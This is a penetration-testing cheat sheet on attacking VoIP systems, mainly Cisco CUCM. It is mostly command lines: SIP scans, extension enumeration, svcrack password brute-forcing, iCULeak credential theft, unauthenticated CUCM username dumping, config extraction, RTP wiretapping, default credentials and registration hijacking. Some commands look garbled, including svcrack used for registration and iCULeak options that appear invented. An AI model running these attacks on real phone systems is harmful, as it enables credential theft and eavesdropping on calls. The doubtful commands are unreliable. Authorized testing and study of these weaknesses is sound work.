# Voice Over IP (VoIP)

VoIP systems, particularly Cisco Unified Communications Manager (CUCM), are commonly found in enterprise environments and can provide initial access vectors, username enumeration, and potential credential harvesting opportunities.

## Resources

* TrustedSec Cisco Hacking - Manual Walkthrough
  * [https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/](https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/)
* N00py Username Dumping - Manual Walkthrough
  * [https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/](https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/)
* Vartai Security - Practical VoIP Penetration Testing
  * [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

## Discovery

### SIP Service Discovery

Identify SIP services on the network:

```bash
# Nmap SIP enumeration
nmap -sU -p 5060 10.10.10.0/24 --script=sip-methods

# SIP banner grab
nmap -sV -p 5060,5061 10.10.10.123
```

### VoIP Protocol Identification

```bash
# Check for common VoIP ports
nmap -p 5060,5061,5070,5080,8000,8080,8443 10.10.10.123

# Scan for RTP ports (audio streams)
nmap -sU -p 10000-20000 10.10.10.123
```

## SIPVicious Tools

SIPVicious is a suite of tools for auditing SIP-based VoIP systems.

### Installation

```bash
pip3 install sipvicious
```

### Extension Enumeration

Enumerate valid SIP extensions:

{% code overflow="wrap" %}
```bash
# Basic extension scan
svmap 10.10.10.123

# Enumerate extensions with svwar
svwar -m INVITE -e100-999 10.10.10.123

# Enumerate with custom range
svwar -m REGISTER -e1000-9999 10.10.10.123 -v

# Fast enumeration
svwar -m INVITE -e100-999 10.10.10.123 --compact
```
{% endcode %}

### SIP Authentication Cracking

Crack SIP authentication credentials:

{% code overflow="wrap" %}
```bash
# Dictionary attack against SIP extensions
svcrack -u 101 -d /usr/share/wordlists/rockyou.txt 10.10.10.123

# Crack multiple extensions
svcrack -u extensions.txt -d passwords.txt 10.10.10.123

# Crack with specific range
svcrack -r 100-200 -d passwords.txt 10.10.10.123
```
{% endcode %}

## Cisco IP Phone Exploitation

### iCULeak.py - Credential Theft

GitHub: [https://github.com/llt4l/iCULeak.py](https://github.com/llt4l/iCULeak.py)

Exploit misconfigured Cisco IP phones to obtain domain credentials. Physical access to a Cisco IP phone can provide initial AD access during a pentest.

{% code overflow="wrap" %}
```bash
# Basic usage
python3 iCULeak.py --target 10.10.10.123

# Automated credential extraction
python3 iCULeak.py --target 10.10.10.123 --auto

# Extract configuration files
python3 iCULeak.py --target 10.10.10.123 --dump-config
```
{% endcode %}

Source Tweet: [https://twitter.com/snovvcrash/status/1555542379272323072?s=20\&t=d1esgQD98FboqHYBB2bS9w](https://twitter.com/snovvcrash/status/1555542379272323072?s=20\&t=d1esgQD98FboqHYBB2bS9w)

### CUCM Username Enumeration

Unauthenticated username dumping via CUCM:

{% code overflow="wrap" %}
```bash
# Manual enumeration via directory service
curl -k "https://cucm.burmat.co:8443/cucm-uds/users"

# Extract usernames from response
curl -k "https://cucm.burmat.co:8443/cucm-uds/users" | grep -oP '(?<=<userName>)[^<]+'

# Enumerate with different pages
for i in {1..10}; do curl -k "https://cucm.burmat.co:8443/cucm-uds/users?start=$((i*100))" >> users.xml; done
```
{% endcode %}

### Configuration File Extraction

Cisco IP phones often expose configuration files:

{% code overflow="wrap" %}
```bash
# Common configuration file paths
curl -k http://10.10.10.123/SEPxxxxxxxxxxxx.cnf.xml
curl -k http://10.10.10.123/LocalizationConfig.xml
curl -k http://10.10.10.123/networkConfig
curl -k http://10.10.10.123/portConfig

# Extract TFTP server information
curl -k http://10.10.10.123/NetworkConfiguration | grep -i tftp
```
{% endcode %}

## Call Interception

### RTP Stream Capture

Capture and decode VoIP audio streams:

```bash
# Capture RTP traffic
tshark -i eth0 -f "udp portrange 10000-20000" -w voip_capture.pcap

# Decode with Wireshark (GUI)
# Telephony -> RTP -> RTP Streams -> Analyze -> Play Streams

# Extract audio with rtpbreak
rtpbreak -d eth0 -W output
```

### VoIP Wiretapping

```bash
# Use vomit to convert Cisco IP phone traffic to WAV
vomit -r voip_capture.pcap

# SIPp for call simulation and testing
sipp -sn uac 10.10.10.123:5060
```

## Common Attack Vectors

### Default Credentials

Common default credentials for VoIP systems:

* Cisco CUCM: `admin:admin`, `administrator:admin`
* Avaya: `admin:admin`, `Administrator:AvayaPassword`
* Asterisk: `admin:admin`, `root:password`
* 3CX: `admin:admin`

### SIP Registration Hijacking

Register as a legitimate extension to make/receive calls:

```bash
# Register extension with credentials
svcrack -u 1001 -p Password123 10.10.10.123

# Make test call
sipp -sf call_scenario.xml 10.10.10.123:5060
```
